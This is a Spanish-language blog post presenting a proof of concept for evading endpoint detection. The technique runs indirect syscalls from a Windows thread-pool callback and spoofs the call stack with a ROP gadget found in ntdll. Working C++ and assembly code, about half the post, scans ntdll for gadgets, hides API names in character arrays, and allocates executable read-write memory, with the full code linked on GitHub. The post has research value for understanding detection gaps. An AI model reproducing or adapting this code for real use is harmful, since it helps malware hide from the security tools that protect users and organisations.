---
title: Indirect Syscalls + CallStack Spoofing
date: 2024-01-22 20:18:00 +0800
categories: [Malware, Evasion]
tags: [POC]
---

## <u>Syscalls Indirectas</u>

Esta técnica aparece a modo de alternativa de las Syscalls directas. Tal y como se indica en DirectSyscalls, uno de los problemas principales en este ámbito es el uso de instrucciones Syscall desde código del propio ejecutable o módulos no verificados.

Para solventar esto aparece el uso de Syscalls Indirectas. Esta técnica consiste en aprovechar las instrucciones Syscalls encontradas en la ntdll.dll para ejecutar el SSN que nosotros queramos.

Tomando como referencia el ejemplo de DirectSyscalls, para aplicar esta técnica sería tan sencillo como sustituir la instrucción Syscall por un salto a la ntdll.dll. Justo donde se encuentre la combinación de instrucciones Syscall + Return.

![img-description](/assets/img/indirect-syscalls-poc/img1.png)

De esta manera, como se observa en la imagen, se estaría ejecutando la Syscall en el espacio de memoria de la ntdll.dll en lugar del de "mi_code.exe".

### <u>Problemas</u>

Tal y como comenta el creador de Brute Ratel en su blog ([https://0xdarkvortex.dev/hiding-in-plainsight/](https://0xdarkvortex.dev/hiding-in-plainsight/)), el uso de Syscalls Indirectas en su forma más básica no funciona a día de hoy.

Los avanzados mecanismos de detección han simplificado considerablemente la identificación de los IndirectSyscalls. Esto se debe a que, a través del seguimiento de eventos (ETW), un EDR puede identificar la ejecución de una Syscall y luego verificar la forma en que se está llevando a cabo. Si un EDR detecta la ejecución de una Syscall específica en una región de memoria donde no debería o si se encuentra una CallStack inválida durante su ejecución, el EDR podría tomar medidas correspondientes, como detener la ejecución del código en cuestión.

Por ende, resulta complicado implementar este tipo de técnicas frente a estos mecanismos.

## <u>Callstack Spoofing</u>

A modo de un pequeño parche en la ejecución de Syscalls de forma indirecta, mi propuesta es la de ocultar o realizar un spoofing de la CallStack. De esta manera, estaríamos evadiendo los mecanismos de detección que traten de validar la CallStack ante la ejecución de determinadas Syscalls.

### <u>Funcionamiento</u>

Para simplificar el funcionamiento de un CallStack Spoofing, considero que se deben producir estos tres pasos como mínimo:

1. <b>Alterar el Stack</b>. Realizar los cambios en el Stack para falsificar u ocultar aquello que se desee en la CallStack (en este caso el return a nuestro código código).
2. <b>Ejecutar la Syscall</b>. Realizar los pasos necesarios para ejecutar la Syscall de forma indirecta.
3. <b>Recuperar el control</b>. Recuperar otra vez el control del flujo de la ejecución devolviendo el Stack a su estado original o correcto.

Una forma no muy compleja de realizar esto podría ser guardando la dirección de retorno en un registro no volátil y regresar a nuestro código mediante un gadjet ROP en una DLL del sistema.

Esto se podría realizar mediante una rutina trampolín que modificase el stack, preparase la pila y realizase el salto correspondiente.

![img-description](/assets/img/indirect-syscalls-poc/img2.png)

## <u>Windows Thread Pooling</u>

El Windows Thread Pooling es mecanismo proporcionado por Windows para gestionar y optimizar el uso de hilos en una aplicación. Este mecanismo ayuda a evitar la creación y destrucción excesiva de hilos, mejorando así la eficiencia y el rendimiento de las aplicaciones que necesitan realizar tareas concurrentes.

En lugar de crear un nuevo hilo cada vez que se necesita, la agrupación de hilos mantiene un conjunto de hilos reutilizables que pueden asignarse de forma dinámica entre las tareas que lo requieran. Estos hilos preexistentes se almacenan en una "pool", y cuando una tarea está lista para ejecutarse, se asigna uno de los hilos del pool para llevar a cabo esa tarea.

Para poder trabajar con este sistema podemos emplear las funciones TpAllocWork, TpPostWork y TpReleaseWork de la NTDLL.

```c++
#include <windows.h>
#include <cstdio>

//Definition of the Windows Thread Pooling functions
typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

FARPROC pTpAllocWork;
FARPROC pTpPostWork;
FARPROC pTpReleaseWork;

DWORD WINAPI Test(LPVOID lpParam) {
    printf("Function test.\n");
    getchar();
    return 0;
}

int main() {
    unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
    HMODULE hNtdll = GetModuleHandleA((LPCSTR)sNtdll);

    unsigned char sTpAllocWork[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k' , 0x0 };
    pTpAllocWork = GetProcAddress(hNtdll, (LPCSTR)sTpAllocWork);

    unsigned char sTpPostWork[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k' , 0x0 };
    pTpPostWork = GetProcAddress(hNtdll, (LPCSTR)sTpPostWork);

    unsigned char sTpReleaseWork[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0x0 };
    pTpReleaseWork = GetProcAddress(hNtdll, (LPCSTR)sTpReleaseWork);

    PTP_WORK WorkReturn = NULL;

    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)Test, NULL, NULL);

    ((TPPOSTWORK)pTpPostWork)(WorkReturn);

    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

    WaitForSingleObject((HANDLE)-1, 0x10000);

    return 0;
}
```

### <u>Callstack de un hilo normal VS hilo de la Windows Thread Pooling</u>

Si observamos la ejecución normal de la función Test podemos ver que nuestro código se ejecuta en un solo hilo.

![img-description](/assets/img/indirect-syscalls-poc/img3.png)

Por lo tanto, la CallStack de este hilo contiene varios returns a nuestro código "malicious.exe" ya que internamente se ha pasado por varias funciones: main, Test, etc.

![img-description](/assets/img/indirect-syscalls-poc/img4.png)

Sin embargo, cuando ejecutamos la función Test en un hilo de la Windows Thread Pooling, la CallStack es diferente. Únicamente aparece un return hacia nuestro código "malicious.exe".

![img-description](/assets/img/indirect-syscalls-poc/img5.png)

Esto se debe a que la función Test estaría funcionando como callback del hilo. Es decir, cuando se cree el hilo se ejecutará única y exclusivamente la función que nosotros hayamos indicado. Por lo tanto, el hilo al ser iniciado por el sistema, se estaría saltando funciones o rutinas por las que en el caso anterior se tiene que pasar para ejecutar la función de Test.

## <u>Mi POC</u>

Teniendo en cuenta el funcionamiento de un CallStack Spoofing y la CallStack de un hilo la Windows Thread Polling he desarrollado una POC en la que se junten estos conceptos para lograr ejecutar una Syscall indirecta de una forma no muy compleja.

### <u>Funcionamiento</u>

Los pasos que debe seguir nuestro programa son:

#### 1 - Buscar el ROP gadjet

Encontrar un gadjet en la NTDLL que permita reducir el tamaño de la pila y devolverla a su estado original.

![img-description](/assets/img/indirect-syscalls-poc/img6.png)

#### 2 - Crear un hilo

Crear un hilo mediante la Windows Thread Polling, empleando las funciones TpAllocWork, TpPostWork y TpReleaseWork de la NTDLL. Que ejecutará como callback nuestra rutina en ensamblador.

#### 3 - Alterar el stack

Una vez creado el hilo se ejecutará nuestra rutina en ensamblador. Desde ella se incrementará el tamaño del StackFrame, se introducirán los parámetros necesarios para ejecutar la Syscall y se introducirá la dirección del gadjet como la de return.

![img-description](/assets/img/indirect-syscalls-poc/img7.png)

![img-description](/assets/img/indirect-syscalls-poc/img8.png)

#### 4 - Ejecutar la Syscall indirecta

Desde esta misma rutina de ensamblador se realizará un salto a una de las Syscalls de la NTDLL.

![img-description](/assets/img/indirect-syscalls-poc/img9.png)

![img-description](/assets/img/indirect-syscalls-poc/img10.png)

![img-description](/assets/img/indirect-syscalls-poc/img11.png)

#### 5 - Return al ROP gadjet

Tras ejecutar la instrucción Syscall se ejecutará el return, el cual realizará un salto hasta la dirección del gadjet. Tras esto, se devolverá el estado original al Stack y se realizará un return de vuelta a nuestro programa.

![img-description](/assets/img/indirect-syscalls-poc/img12.png)

![img-description](/assets/img/indirect-syscalls-poc/img13.png)

#### 6 - Fin del hilo

Por último, se continuará con la ejecución normal del hilo y este terminará su ejecución.

### <u>Observaciones</u>

Como puede observarse, en el momento en el que se ejecuta la Syscall el CallStack aparece de la siguiente manera.

![img-description](/assets/img/indirect-syscalls-poc/img14.png)

Siendo el 0 la dirección de la función que aprovechamos para ejecutar la Syscall y el 1 la dirección donde se encuentra el gadjet. De esta manera no habría rastro de nuestro código en la CallStack.

```c++
#include <windows.h>
#include <cstdio>

//Definition of the Windows Thread Pooling functions
typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

FARPROC pTpAllocWork;
FARPROC pTpPostWork;
FARPROC pTpReleaseWork;

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    HANDLE hProcess;
    PVOID* address;
    SIZE_T zeroBits;
    PSIZE_T size;
    ULONG allocationType;
    ULONG permissions;
    DWORD ssn;
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

//Rutina de ensamblador
extern "C" void NtAllocateVirtualMemory_Callback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work
);

extern "C" void Search_For_Syscall_Ret(
    HANDLE ntdllHandle
);

extern "C" void Search_For_Add_Rsp_Ret(
    HANDLE ntdllHandle
);

int main() {
    unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
    HMODULE hNtdll = GetModuleHandleA((LPCSTR)sNtdll);

    unsigned char sTpAllocWork[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k' , 0x0 };
    pTpAllocWork = GetProcAddress(hNtdll, (LPCSTR)sTpAllocWork);

    unsigned char sTpPostWork[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k' , 0x0 };
    pTpPostWork = GetProcAddress(hNtdll, (LPCSTR)sTpPostWork);

    unsigned char sTpReleaseWork[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0x0 };
    pTpReleaseWork = GetProcAddress(hNtdll, (LPCSTR)sTpReleaseWork);

    //Search for Syscall + Ret
    Search_For_Syscall_Ret(hNtdll);

    //Search for add rsp, 78 + Ret
    Search_For_Add_Rsp_Ret(hNtdll);

    //Preparation of the structure NTALLOCATEVIRTUALMEMORY_ARGS
    PVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = 0x1000;

    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.zeroBits = 0;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.allocationType = (MEM_RESERVE | MEM_COMMIT);
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
    
    //Syscall number
    ntAllocateVirtualMemoryArgs.ssn = 0x18;

    //Thread creation
    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)NtAllocateVirtualMemory_Callback, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

    WaitForSingleObject((HANDLE)-1, 0x5000);

    return 0;
}
```

```c++
section .data

syscall_ret dq 0000000000000000h    ; syscall + ret instruction combination address
add_rsp_ret dq 0000000000000000h    ; add rsp, 0x78 + ret instruction combination address

section .text

global NtAllocateVirtualMemory_Callback
global Search_For_Syscall_Ret
global Search_For_Add_Rsp_Ret

NtAllocateVirtualMemory_Callback:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
    mov rcx, [rbx]              ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x8]        ; PVOID *BaseAddress
    mov r8, [rbx + 0x10]        ; ULONG_PTR ZeroBits
    mov r9, [rbx + 0x18]        ; PSIZE_T RegionSize
    mov r10, [rbx + 0x24]       ; ULONG Protect
    mov [rsp+0x30], r10         ; stack pointer for 6th arg
    mov r10, [rbx + 0x20]       ; ULONG AllocationType
    mov [rsp+0x28], r10         ; stack pointer for 5th arg
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x28]
    jmp r15

Search_For_Syscall_Ret:
    ; Search for Syscall + Ret
    mov rdx, rax
    add rdx, 1
    xor rbx, rbx
    xor rcx, rcx
    mov rcx, 00FFFFFF0000000000h
    mov rdi, [rdx]
    and rdi, rcx
    or rbx, rdi
    shr rbx, 28h
    cmp rbx, 1F0FC3h
    jne Search_For_Syscall_Ret + 3h
    mov r15, syscall_ret
    mov [r15], rdx
    xor r15, r15
    ret

Search_For_Add_Rsp_Ret:
    ; Search for add rsp, 78 + Ret
    mov rdx, rax
    add rdx, 1
    xor rbx, rbx
    xor rcx, rcx
    mov rcx, 0000FFFFFFFFFFh
    mov rdi, [rdx]
    and rdi, rcx
    or rbx, rdi
    mov r14, 00C378C48348h
    cmp rbx, r14
    jne Search_For_Add_Rsp_Ret + 3h
    mov r15, add_rsp_ret
    mov [r15], rdx
    ret
```

El código completo puedes encontrarlo en [mi GitHub](https://github.com/pard0p/CallstackSpoofingPOC)